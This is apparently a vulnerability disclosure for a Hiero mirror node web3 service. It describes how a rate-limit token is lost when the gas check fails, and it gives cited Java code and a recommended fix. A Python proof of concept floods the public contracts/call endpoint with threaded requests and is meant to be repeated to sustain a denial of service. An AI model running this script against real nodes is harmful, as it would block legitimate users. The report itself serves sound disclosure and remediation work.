### Title
Rate-Limit Token Leak on Gas-Check Failure Enables Amplified DoS Against All Historical Queries

### Summary
In `ThrottleManagerImpl.throttle()`, a rate-limit token is consumed from `rateLimitBucket` before the `gasLimitBucket` check. When the gas check fails, the already-consumed rate-limit token is never restored. An unprivileged attacker can exhaust the `gasLimitBucket` with a single large-gas request, then send `requestsPerSecond - 1` additional requests that each pass the rate-limit check but fail the gas check, silently draining all rate-limit tokens and blocking every legitimate caller for the remainder of the refill window.

### Finding Description

**Exact code path:**

`ThrottleManagerImpl.throttle()` — [1](#0-0) 

```
if (!rateLimitBucket.tryConsume(1)) {          // (A) token consumed here
    throw new ThrottleException(...);
} else if (!gasLimitBucket.tryConsume(...)) {  // (B) fails → token from (A) is LOST
    throw new ThrottleException(...);
}
```

**Root cause:** There is no rollback of the `rateLimitBucket` token when the `gasLimitBucket` check at line 40 fails. The `restore()` method [2](#0-1)  only returns tokens to `gasLimitBucket`; it has no counterpart for `rateLimitBucket`.

**Bucket parameters (defaults):**
- `requestsPerSecond = 500` → `rateLimitBucket` capacity = 500 tokens/s [3](#0-2) 
- `gasPerSecond = 7_500_000_000` → after `scaleGas` (`/ 10_000`): `gasLimitBucket` capacity = 750,000 tokens/s [4](#0-3) 
- `scaleGas(gas)` returns **0** (always passes) when `gas ≤ 10,000`, so the attacker must use `gas > 10,000` to trigger a gas-check failure [5](#0-4) 

**Exploit flow:**
1. **Step 1 — exhaust gas bucket:** Send 1 request with `gas = 7,500,000,000`. `rateLimitBucket` loses 1 token; `gasLimitBucket` loses all 750,000 tokens.
2. **Step 2 — drain rate-limit bucket:** Send 499 requests with `gas = 10,001` (scaled = 1). Each request: passes `rateLimitBucket.tryConsume(1)` (consuming 1 token), then fails `gasLimitBucket.tryConsume(1)` (bucket empty), and the rate-limit token is silently discarded.
3. **Result:** Both buckets are fully exhausted after 500 total requests. All subsequent legitimate callers receive `ThrottleException` for up to 1 second. The attacker repeats every second.

**Existing checks reviewed and shown insufficient:**
- `rateLimitBucket` uses no-synchronization strategy (default); `gasLimitBucket` uses `SYNCHRONIZED` [6](#0-5)  — neither prevents the token leak.
- There is no IP-based per-client sub-limit, no authentication gate, and no mechanism to credit back `rateLimitBucket` tokens on downstream check failures anywhere in the call chain. [7](#0-6) 

### Impact Explanation
Every legitimate caller — including read-only historical queries — is blocked for up to 1 second per attack cycle. Because the attacker can repeat the 500-request burst every second indefinitely, the effective availability of the endpoint drops to near zero. The gas bucket's exhaustion also means that even if the rate-limit bucket were not drained, high-gas legitimate calls would still be rejected. The combined exhaustion of both buckets with a single coordinated burst is the amplification that makes this worse than a plain rate-limit flood.

### Likelihood Explanation
No privileges, API keys, or special network position are required — only the ability to send HTTP requests to the public endpoint. The 500 req/s threshold is trivially reachable from a single machine or a small botnet. The attack is fully repeatable every second and requires no state between bursts. Bucket4j's greedy refill means the window resets cleanly, making the timing straightforward to automate.

### Recommendation
Restore the `rateLimitBucket` token when the gas check fails, mirroring the existing `restore()` pattern for gas:

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
} else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
    rateLimitBucket.addTokens(1);   // ← restore the leaked token
    throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
}
```

Alternatively, use Bucket4j's `tryConsumeAndReturnRemaining` with a two-phase check, or restructure the checks so both buckets are probed before either is consumed (probe → consume atomically). Also consider per-IP sub-buckets to prevent a single client from exhausting shared capacity.

### Proof of Concept

```python
import requests, threading

TARGET = "http://<mirror-node>/api/v1/contracts/call"
BODY_BIG_GAS  = {"gas": 7_500_000_000, "data": "0x", "to": "0x0000000000000000000000000000000000000001"}
BODY_SMALL_GAS = {"gas": 10_001,       "data": "0x", "to": "0x0000000000000000000000000000000000000001"}

# Step 1: exhaust gasLimitBucket
requests.post(TARGET, json=BODY_BIG_GAS)

# Step 2: drain rateLimitBucket (499 requests, each fails on gas, leaks rate token)
def drain():
    requests.post(TARGET, json=BODY_SMALL_GAS)

threads = [threading.Thread(target=drain) for _ in range(499)]
[t.start() for t in threads]
[t.join() for t in threads]

# Step 3: legitimate user is now blocked
r = requests.post(TARGET, json=BODY_SMALL_GAS)
assert r.status_code == 429  # "Requests per second rate limit exceeded"
print("DoS confirmed:", r.text)
```

Repeat the three steps in a loop every ~1 second to sustain the denial of service.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L37-49)
```java
    public void throttle(ContractCallRequest request) {
        if (!rateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        } else if (!gasLimitBucket.tryConsume(throttleProperties.scaleGas(request.getGas()))) {
            throw new ThrottleException(GAS_PER_SECOND_LIMIT_EXCEEDED);
        }

        for (var requestFilter : throttleProperties.getRequest()) {
            if (requestFilter.test(request)) {
                action(requestFilter, request);
            }
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L59-64)
```java
    public void restore(long gas) {
        long tokens = throttleProperties.scaleGas(gas);
        if (tokens > 0) {
            gasLimitBucket.addTokens(tokens);
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L26-26)
```java
    private long gasPerSecond = 7_500_000_000L;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L35-35)
```java
    private long requestsPerSecond = 500;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L42-47)
```java
    public long scaleGas(long gas) {
        if (gas <= GAS_SCALE_FACTOR) {
            return 0L;
        }
        return Math.floorDiv(gas, GAS_SCALE_FACTOR);
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L34-45)
```java
    @Bean(name = GAS_LIMIT_BUCKET)
    Bucket gasLimitBucket() {
        long gasLimit = throttleProperties.getGasPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(gasLimit)
                .refillGreedy(gasLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder()
                .withSynchronizationStrategy(SynchronizationStrategy.SYNCHRONIZED)
                .addLimit(limit)
                .build();
    }
```
